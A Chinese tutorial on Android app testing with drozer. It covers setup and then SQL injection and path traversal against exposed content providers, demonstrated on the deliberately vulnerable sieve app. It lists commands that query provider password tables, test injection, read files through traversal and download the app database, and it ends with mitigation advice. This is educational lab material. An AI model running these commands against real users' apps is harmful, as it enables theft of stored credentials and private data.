# Android App Injection&&Drozer Use

0x01 准备工作
---------

* * *

测试环境：

1) 手机root权限

2) Adb.exe

3) 手机usb连接开启debug模式(在设置>关于手机>连续点击多次版本号，即可开启开发者模式)

4) Window下安装[drozer](https://www.mwrinfosecurity.com/products/drozer/community-edition/)

5) 安装完drozer后在其目录下把agent.apk安装到手机

6)[WebContentResolver.apk](https://labs.mwrinfosecurity.com/system/assets/116/original/WebContentResolver.zip)

7) 附带测试案例使用app[sieve](https://www.mwrinfosecurity.com/system/assets/380/original/sieve.apk)

0x02 drozer安装与使用
----------------

* * *

**安装**

1) windows安装 下载：

https://www.mwrinfosecurity.com/products/drozer/community-edition/

在Android设备中安装agent.apk：

```
>adb install agent.apk

```

或者直接连接USB把文件移动到内存卡中安装

2) *inux安装（Debian/Mac）

```
$ wget http://pypi.python.org/packages/2.7/s/setuptools/setuptools-0.6c11-py2.7.egg
$ sh setuptools-0.6c11-py2.7.egg
$ easy_install --allow-hosts pypi.python.org protobuf
$ easy_install twisted==10.2.0
$ easy_install twisted ./drozer-2.3.0-py2.7.egg
$ drozer        //运行测试

```

下面介绍三种方法运行

1) USB方式

```
>adb forward tcp:31415 tcp:31415        //adb目录下运行次命令
选择drozer>Embedded Server>Enabled
>drozer.bat console connect     //在PC端drozer目录下运行此命令

```

2) Wifi方式

```
>drozer.bat console connect --server 192.168.1.12:31415  //在PC端执行192.168.1.12为android端ip和端口

```

3) Infrastructure Mode 这种模式涉及到三个通信方，drozer server、drozer agent（Android 设备中）与drozer console。

其中server与agent，server与console需要网络互通。这种模式的好处是你不需要知道android设备的ip，

agent与console的ip段可以隔离的，并且可以支持一个server对应多个设备的操作。

```
>drozer.bat server start

```

在Android设备上新建一个New Endpoint，修改配置Host为PC server端ip,并且启用Endpoint

```
>drozer console connect --server 192.168.1.2:31415      //192.168.1.2为server端ip和端口

```

**使用**

```
> list  //列出目前可用的模块，也可以使用ls
> help app.activity.forintent       //查看指定模块的帮助信息
> run app.package.list      //列出android设备中安装的app
> run app.package.info -a com.android.browser       //查看指定app的基本信息
> run app.activity.info -a com.android.browser      //列出app中的activity组件
> run app.activity.start --action android.intent.action.VIEW --data-uri  http://www.google.com  //开启一个activity，例如运行浏览器打开谷歌页面
> run scanner.provider.finduris -a com.sina.weibo       //查找可以读取的Content Provider
> run  app.provider.query content://settings/secure --selection "name='adb_enabled'"    //读取指定Content Provider内容
> run scanner.misc.writablefiles --privileged /data/data/com.sina.weibo     //列出指定文件路径里全局可写/可读的文件
> run shell.start       //shell操作
> run tools.setup.busybox       //安装busybox
> list auxiliary        //通过web的方式查看content provider组件的相关内容
> help auxiliary.webcontentresolver     //webcontentresolver帮助
> run auxiliary.webcontentresolver      //执行在浏览器中以http://localhost:8080即可访问
以sieve示例
> run app.package.list -f sieve         //查找sieve应用程序
> run app.package.info -a com.mwr.example.sieve         //显示app.package.info命令包的基本信息
> run app.package.attacksurface com.mwr.example.sieve   //确定攻击面
> run app.activity.info -a com.mwr.example.sieve         //获取activity信息
> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList     //启动pwlist
> run app.provider.info -a com.mwr.example.sieve        //提供商信息
> run scanner.provider.finduris -a com.mwr.example.sieve        //扫描所有能访问地址 
>run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/--vertical  //查看DBContentProvider/Passwords这条可执行地址
> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"   //检测注入
> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts    //查看读权限数据
> run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db //下载数据
> run scanner.provider.injection -a com.mwr.example.sieve       //扫描注入地址
> run scanner.provider.traversal -a com.mwr.example.sieve
> run app.service.info -a com.mwr.example.sieve         //查看服务

```

0x03 Android App Injection
--------------------------

1) 首先用drozer扫描Android应用可注入的Url

```
Dz > run scanner.provider.injection

```

![enter image description here](http://drops.javaweb.org/uploads/images/2a07e5b8fea3e5ec1354f448bf6aa65d92eaef8d.jpg)

2) 启动WebContentResolver.apk应用程序，Web界面访问url格式如下

http://localhost:8080/query?a=providers&path0=Parameter1&path1=Parameter2&pathn=parametern&selName=column&selId=id

![enter image description here](http://drops.javaweb.org/uploads/images/4c679b1acaab56fca18ca2b3fb1da5668e626ff2.jpg)

解释： providers：为content://后第一个参数比如records Parameter1：为第二个参数operations Parameter2..parametern：为后门的依次类推的参数，如果后面有这么多参数 Column：表字段例如上面字段<_id> Id：为字段数据

注意：格式必须是这样，selName、selId这两个参数第二个单词是大写的。

3) 在PC端运行adb

```
>adb forward tcp:8080 tcp:8080  //此时在地址栏输入http://localhost:8080即可访问Web界面

```

4) 以content://settings/bookmarks/为例，在地址栏输入

```
http://localhost:8080/query?a=settings&path0=bookmarks&selName=_id&selId=1

```

![enter image description here](http://drops.javaweb.org/uploads/images/4c679b1acaab56fca18ca2b3fb1da5668e626ff2.jpg)

5) 自动化结合SQLMAP

![enter image description here](http://drops.javaweb.org/uploads/images/d17aa169b2a84a14cdc1bf1adbad3a20f73323e3.jpg)

0x04 总结&&解决方案
-------------

* * *

总结：虽然很多小伙说直接用文件管理进去查看数据库更方便，我也不多说什么，就像上次看到一帖子为了查看wifi密码写了一大篇的，直接进去数据库看不就是了，我能呵呵一句么。 避免这个漏洞方法只需要指定标志读取权限和限制写入权限。如果我们不想共享存储第三方应用程序记录,另一个解决方案可以消除provider或将其设置为false。

0x05 参考：
--------

* * *

*   https://labs.mwrinfosecurity.com/blog/2011/12/02/how-to-find-android-0day-in-no-time/